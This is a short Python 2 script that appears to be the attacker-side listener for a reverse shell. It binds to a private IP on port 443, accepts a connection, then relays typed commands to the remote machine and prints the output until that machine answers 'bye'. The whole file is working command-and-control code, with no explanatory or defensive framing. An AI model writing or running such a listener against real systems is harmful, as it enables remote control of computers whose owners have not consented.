import socket
import sys

s = socket.socket()
host = "192.168.1.12"
port = 443
buffSize = 1024*2
s.bind((host, port))
print ('Setup at ', host)
s.listen(5)
c, addr = s.accept();
print ("Connected to ", addr)
print (c.recv(buffSize).decode("utf-8"))
print ("Shot Commands!")
run = True

while run:
    try:
        cmd = str(raw_input(">"))
        if cmd == "\n" or cmd is not None:
            c.send(cmd+'\n')
        else:
            continue
        response = c.recv(buffSize).strip().decode("utf-8")
        print (response)
        if response == "bye":
            run = False
            c.close()
            sys.exit(0)
            print ("Exit!")
    except KeyboardInterrupt:
        print("handled")

